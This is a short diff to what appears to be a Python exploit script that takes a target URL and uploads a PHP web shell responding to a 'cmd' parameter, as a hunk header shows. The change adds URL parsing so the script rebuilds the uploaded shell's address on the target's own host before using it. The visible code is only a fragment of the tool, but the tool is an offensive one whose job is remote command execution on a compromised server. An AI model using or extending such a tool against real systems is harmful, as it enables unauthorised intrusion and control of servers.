@@ -15,6 +15,7 @@ import random
 import string
 import json
 import sys
+from urllib.parse import urlparse
 
 parser = optparse.OptionParser()
 parser.add_option("-u", "--url", dest="url", help="Target URL ex: http://localhost:8080")
@@ -104,6 +105,12 @@ if(isset($_GET['cmd'])){
 
     if "previewsData" in data_j:
         shell_url = data_j["previewsData"]["images"][0]["url"]
+
+        parsed_shell = urlparse(shell_url)
+        parsed_base  = urlparse(BASE)
+
+        shell_url = f"{parsed_base.scheme}://{parsed_base.netloc}{parsed_shell.path}"
+
 
     if not shell_url:
         print("[x] Could not extract shell URL")
